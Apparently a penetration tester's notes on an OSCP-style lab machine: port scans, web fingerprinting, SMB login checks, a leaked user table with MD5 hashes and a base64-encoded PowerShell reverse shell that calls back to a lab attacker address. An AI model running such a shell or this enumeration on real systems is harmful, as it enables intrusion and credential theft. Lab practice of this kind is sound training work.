PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev)
|_http-server-header: Apache/2.4.54 (Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev
|_http-title: Home
|_http-generator: Nicepage 5.5.0, nicepage.com
| http-methods:
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-06-19T13:09:44+00:00; -33d02h05m16s from scanner time.
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Issuer: commonName=MS01.oscp.exam
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-06T17:10:31
| Not valid after:  2024-11-05T17:10:31
| MD5:   881b:600d:a5e3:5c5e:2e1c:dd94:184a:887f
|_SHA-1: b547:faed:d7af:908d:7986:d827:86ec:1507:7349:cdfe
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: MS01.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-19T13:09:03+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC

Port 21 - ftp requires ssl

Port 80 - Names for Website

Salma Keon
Marcus Smith
Nicola Aguilar
May Dowson
Betty Nilson
Adrianna Scold
Jennie Kinny
Polly Walter
Franke Clarke
Elmer Briggs

Apache 2.4.54
Php 8.0.26 - may be vulnerable CVE-2024-4577
mod_fcgid/2.3.10-dev - Does not seem to be vulnerable (quick search)

WhatWeb report for http://ms01.oscp.exam:80
Status    : 200 OK
Title     : Home
IP        : 192.168.136.101
Country   : RESERVED, ZZ

Summary   : Apache[2.4.54][mod_fcgid/2.3.10-dev], HTML5, HTTPServer[Apache/2.4.54 (Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev], JQuery, Matomo, MetaGenerator[Nicepage 5.5.0, nicepage.com], Open-Graph-Protocol[website], PHP[8.0.26], Script[application/ld+json,text/javascript]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.

        Version      : 2.4.54 (from HTTP Server Header)
        Module       : mod_fcgid/2.3.10-dev
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        String       : Apache/2.4.54 (Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse
        HTML documents, handle events, perform animations, and add
        AJAX.

        Website     : http://jquery.com/

[ Matomo ]
        Matomo is the leading open alternative to Google Analytics
        that gives you full control over your data. Matomo lets you
        easily collect data from websites, apps & the IoT and
        visualise this data and extract insights. Privacy is
        built-in. Matomo was formerly known as Piwik, and is
        developed in PHP.

        Aggressive function available (check plugin file or details).
        Google Dorks: (1)
        Website     : https://matomo.org

[ MetaGenerator ]
        This plugin identifies meta generator tags and extracts its
        value.

        String       : Nicepage 5.5.0, nicepage.com

[ Open-Graph-Protocol ]
        The Open Graph protocol enables you to integrate your Web
        pages into the social graph. It is currently designed for
        Web pages representing profiles of real-world things .
        things like movies, sports teams, celebrities, and
        restaurants. Including Open Graph tags on your Web page,
        makes your page equivalent to a Facebook Page.

        Version      : website

[ PHP ]
        PHP is a widely-used general-purpose scripting language
        that is especially suited for Web development and can be
        embedded into HTML. This plugin identifies PHP errors,
        modules and versions and extracts the local file path and
        username if present.

        Version      : 8.0.26
        Google Dorks: (2)
        Website     : http://www.php.net/

[ Script ]
        This plugin detects instances of script HTML elements and
        returns the script language/type.

        String       : application/ld+json,text/javascript

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Wed, 19 Jun 2024 13:10:59 GMT
        Server: Apache/2.4.54 (Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev
        Last-Modified: Tue, 28 Feb 2023 11:29:19 GMT
        ETag: "16fc1-5f5c0e80b2ff6"
        Accept-Ranges: bytes
        Content-Length: 94145
        Connection: close
        Content-Type: text/html

Found in ms01.oscp.exam/webaccess/database -> pms_db.sql
INSERT INTO `users` (`id`, `display_name`, `user_name`, `password`, `profile_picture`) VALUES
(1, 'Administrator', 'admin', '0192023a7bbd73250516f069df18b500', '1656551981avatar.png '),
(2, 'John Doe', 'jdoe', '9c86d448e84d4ba23eb089e0b5160207', '1656551999avatar_.png');


command used to get shell:
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMwA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

Port 445 - SMB

No Null Access
 $ nxc smb ms01.oscp.exam -u '' -p ''
SMB         192.168.136.101 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.136.101 445    MS01             [-] oscp.exam\: STATUS_ACCESS_DENIED

   zsh [192.168.0.149] bjorn ~/oscp7/ad_set                                                                                                       22-Jul-2024, 11:22:41 AM
 $ nxc smb ms01.oscp.exam -u 'guest' -p ''
SMB         192.168.136.101 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.136.101 445    MS01             [-] oscp.exam\guest: STATUS_ACCOUNT_DISABLED

